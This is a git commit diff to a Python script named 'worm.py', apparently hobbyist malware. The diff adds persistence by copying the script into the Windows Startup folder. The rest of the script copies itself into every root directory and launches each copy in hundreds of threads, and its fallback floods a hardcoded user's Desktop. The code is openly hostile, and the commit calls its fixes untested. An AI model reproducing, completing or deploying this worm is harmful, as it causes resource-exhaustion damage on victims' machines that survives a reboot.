efcc8bf77ea81fff7547431ceba60c5370177e1e
A.Cookie.1 <148724829+ACookie10012@users.noreply.github.com>
2023-11-11 19:35:24 -0500

    Update worm.py
    Untested fixes, and addition of sticking itself to startup.

--- worm.py
+++ worm.py
@@ -4,6 +4,8 @@ import threading
 import time
 import shutil
 import subprocess
+import sys
+import getpass
 
 NOTI = 500
 F_ex = '.exe'
@@ -12,26 +14,30 @@ def tags(): #Works
     tag = ''.join(str(r.randint(0, 9)) for _ in range(8))
     return tag
 
-def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
+def create_1(dst, name, Active_Thread): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
     while Active_Thread == True:
 
         shutil.copy(__file__, f"{dst}/{name}{F_ex}")
-        time.sleep(1)
         subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)
 
-def create_2(dst, name):
+def create_2(dst, name, Active_Thread):
      while Active_Thread == True:
 
         shutil.copy(__file__, f"{dst}/{name}{F_ex}")
-        time.sleep(1)
         subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)
 
-def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
+def create_file3(dst, name, Active_Thread): # Diff name, should exc when dir not avaiable. (F)
 
     while Active_Thread == True:
         if dst == 'F':
             shutil.copy(__file__, f"{name}{F_ex}")
             subprocess.run(['start', f"{name}{F_ex}"], shell=True)
+
+def add_to_startup():
+    user = getpass.getuser()
+    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+    script_path = os.path.abspath(sys.argv[0])
+    shutil.copy(script_path, startup_folder)
     
 
 def file_run(dst, name):
@@ -39,7 +45,19 @@ def file_run(dst, name):
     #LINKED to one, so every stack gets its own extra.
     subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)
 
-while True:
+def main():
+    user = getpass.getuser()
+    script_path = os.path.abspath(sys.argv[0])
+    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+    if script_path.startswith(startup_folder):
+        # Already in startup folder, do nothing
+        pass
+    else:
+        # Add script to startup folder
+        try:
+            add_to_startup()
+        except:
+            time.sleep(0.5)
     for dir in os.listdir('/'):
         Active_Thread = True
         CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.
@@ -48,26 +66,28 @@ while True:
             #print(f'\x1b[6;30;42m' + 'DIR {dir} ACESSED!' + '\x1b[0m') #For testing purposes 
             try:
                 for _ in range(NOTI):
-                    threading.Thread(target=create_1, args=(dir, CUSTOMTAG)).start()
-                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG)).start()
-                    threading.Thread(target=create_2, args=(dir, f"FILE{tags()}")).start()
+                    threading.Thread(target=create_1, args=(dir, CUSTOMTAG, Active_Thread)).start()
+                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG, Active_Thread)).start()
+                    threading.Thread(target=create_2, args=(dir, f"FILE{tags()}", Active_Thread)).start()
 
                 Active_Thread = False
 
             except:
                 for _ in range(NOTI):
-                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
-                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG)).start()
-                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
+                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread ), ).start()
+                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG, Active_Thread)).start()
+                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()
 
                 Active_Thread = False
 
         else:
             for _ in range(NOTI):
-                threading.Thread(target=create_1, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG)).start() #If no dir was found it will spam your desktop.
-                threading.Thread(target=file_run, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG)).start()
+                threading.Thread(target=create_1, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG, Active_Thread)).start() #If no dir was found it will spam your desktop.
+                threading.Thread(target=file_run, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG, Active_Thread)).start()
             
-                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
-                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
+                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()
+                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()
             Active_Thread = False
-        
+
+if __name__ =="__main__":
+    main()
